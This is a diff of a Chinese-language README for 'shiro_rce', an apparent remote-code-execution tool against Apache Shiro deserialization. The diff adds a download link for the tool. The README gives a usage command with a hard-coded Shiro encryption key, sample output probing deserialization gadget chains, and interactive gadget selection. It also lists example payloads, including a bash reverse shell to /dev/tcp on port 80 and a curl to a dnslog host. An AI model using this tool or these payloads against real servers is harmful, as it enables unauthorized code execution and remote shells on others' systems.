@@ -1,8 +1,11 @@
 # shiro_rce
 
 ```
-受监管要求，暂时不提供下载，后续改版再提供。
-2020-04-24:
+下载地址：
+2020-05-25:
+https://xz.aliyun.com/forum/upload/affix/shiro_tool.zip
+
+原来的停止服务了，请下载最新版本。
 
 
 java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx nslookup/ping1/ping2/curl nocheck key=kPH+bIxk5D2deZiIxcaaaA== req=1.txt keys=key.txt
@@ -28,10 +31,6 @@ keys= --> keys file  自定义key的文件，key按行分割，即每行写一�
 [-] check CommonsCollections5
 [-] check CommonsCollections6
 [-] check CommonsCollections7
-[-] check CommonsCollections8
-[-] check CommonsCollections9
-[-] check CommonsCollections10
-[*] find: CommonsCollections10 can be use
 [-] check Groovy1
 [*] find: Groovy1 can be use
 [-] check JSON1
@@ -44,13 +43,12 @@ keys= --> keys file  自定义key的文件，key按行分割，即每行写一�
 [*] JRMPClient please use: java -cp shiro_tool.jar ysoserial.exploit.JRMPListener 
 0: URLDNS
 1: CommonsBeanutils1
-2: CommonsCollections10
-3: Groovy1
-4: JSON1
-5: Spring1
-6: JRMPClient
+2: Groovy1
+3: JSON1
+4: Spring1
+5: JRMPClient
 [-] please enter the number(0-6)
-4
+3
 [-] use gadget: JSON1
 [*] command example: bash -i >& /dev/tcp/xx.xx.xx.xx/80 0>&1
 [*] command example: curl dnslog.xx.com
